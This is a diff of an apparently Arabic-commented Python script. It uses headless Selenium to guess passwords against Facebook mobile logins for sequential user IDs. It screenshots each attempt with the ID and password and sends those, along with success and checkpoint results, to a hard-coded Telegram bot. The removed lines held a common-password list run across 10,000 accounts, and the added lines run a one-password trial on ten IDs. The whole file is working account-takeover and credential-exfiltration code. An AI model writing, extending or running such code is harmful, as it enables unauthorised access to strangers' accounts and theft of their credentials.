@@ -14,14 +14,8 @@ from concurrent.futures import ThreadPoolExecutor
 TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
 CHAT_ID = "5653032481"
 
-# عداد مشترك بين جميع الخيوط لحساب عدد الصور المرسلة
 shot_count = 0
 shot_lock = threading.Lock()
-
-PASS_LIST = [
-    '123456', '12345678', '123456789', 'jasser123', 'malo123', 'jasser2004', 'jasser2005',
-    'password', '112233', '445566', '778899', '000000', '111111', '12345'
-]
 
 def send_to_tg(text):
     try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
@@ -29,10 +23,11 @@ def send_to_tg(text):
 
 def send_photo_tg(photo_path, caption):
     try:
+        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
         with open(photo_path, 'rb') as photo:
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
-                          data={'chat_id': CHAT_ID, 'caption': caption}, files={'photo': photo})
-    except: pass
+            r = requests.post(url, data={'chat_id': CHAT_ID, 'caption': caption}, files={'photo': photo})
+            return r.status_code == 200
+    except: return False
 
 def check_account(uid):
     global shot_count
@@ -40,49 +35,49 @@ def check_account(uid):
     options.add_argument('--headless')
     options.add_argument('--no-sandbox')
     options.add_argument('--disable-dev-shm-usage')
-    options.add_argument('--window-size=1080,1920')
+    options.add_argument('--window-size=1080,1920') # حجم شاشة الهاتف لضمان ظهور الفورم
     
-    service = Service(ChromeDriverManager().install())
-    driver = webdriver.Chrome(service=service, options=options)
+    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
     
     try:
-        for pas in PASS_LIST:
-            driver.get("https://m.facebook.com/login.php")
-            time.sleep(2)
+        # تجربة كلمة مرور واحدة فقط للتجربة والتصوير السريع
+        pas = "12345678" 
+        driver.get("https://m.facebook.com/login.php")
+        time.sleep(3) # انتظار تحميل الصفحة
+        
+        driver.find_element(By.ID, "m_login_email").send_keys(uid)
+        driver.find_element(By.NAME, "pass").send_keys(pas)
+        
+        # تصوير الشاشة قبل الضغط للتأكد أن البيانات دخلت
+        with shot_lock:
+            if shot_count < 10:
+                shot_count += 1
+                img_name = f"shot_{shot_count}.png"
+                driver.save_screenshot(img_name)
+                success = send_photo_tg(img_name, f"📸 لقطة تجريبية رقم {shot_count}\n🆔 ID: {uid}\n🔑 Pass: {pas}")
+                if os.path.exists(img_name): os.remove(img_name)
+        
+        driver.find_element(By.NAME, "login").click()
+        time.sleep(5)
+        
+        # فحص النتائج (OK/CP)
+        if "c_user" in driver.get_cookies():
+            send_to_tg(f"✅ تم النجاح (OK): {uid}")
+        elif "checkpoint" in driver.current_url:
+            send_to_tg(f"⚠️ نقطة تفتيش (CP): {uid}")
             
-            driver.find_element(By.ID, "m_login_email").send_keys(uid)
-            driver.find_element(By.NAME, "pass").send_keys(pas)
-            driver.find_element(By.NAME, "login").click()
-            time.sleep(5)
-            
-            # فحص إذا كنا سنرسل لقطة شاشة (أول 10 فقط)
-            with shot_lock:
-                if shot_count < 10:
-                    shot_count += 1
-                    screen_name = f"test_{uid}_{shot_count}.png"
-                    driver.save_screenshot(screen_name)
-                    send_photo_tg(screen_name, f"📸 تجربة فحص رقم {shot_count}\n🆔 ID: {uid}\n🔑 Pass: {pas}")
-                    if os.path.exists(screen_name): os.remove(screen_name)
-
-            # التحقق من النجاح أو التفتيش (يرسل دائماً حتى بعد الـ 10 صور الأولى)
-            current_url = driver.current_url
-            if "c_user" in driver.get_cookies():
-                send_to_tg(f"✅ تم الاختراق (OK)\n🆔 ID: {uid}\n🔑 PASS: {pas}")
-                break
-            elif "checkpoint" in current_url:
-                send_to_tg(f"⚠️ نقطة تفتيش (CP)\n🆔 ID: {uid}\n🔑 PASS: {pas}")
-                break
-            
-    except: pass
-    finally: driver.quit()
+    except Exception as e:
+        print(f"Error: {e}")
+    finally:
+        driver.quit()
 
 def run_main():
     start_id = 26701173
-    total = 10000
-    send_to_tg(f"🚀 انطلاق! سأرسل أول 10 لقطات شاشة للتأكد ثم أستمر في الفحص بصمت لـ {total} حساب.")
+    send_to_tg("🚀 بدأت محاولة الإرسال مع الصور.. راقب الآن")
     
-    ids = [str(start_id + i) for i in range(total)]
-    with ThreadPoolExecutor(max_workers=5) as pool:
+    # سنبدأ بـ 10 حسابات فقط للتجربة والتأكد من الصور
+    ids = [str(start_id + i) for i in range(10)]
+    with ThreadPoolExecutor(max_workers=2) as pool: # تقليل العدد لضمان استقرار الصور
         pool.map(check_account, ids)
 
 if __name__ == "__main__":
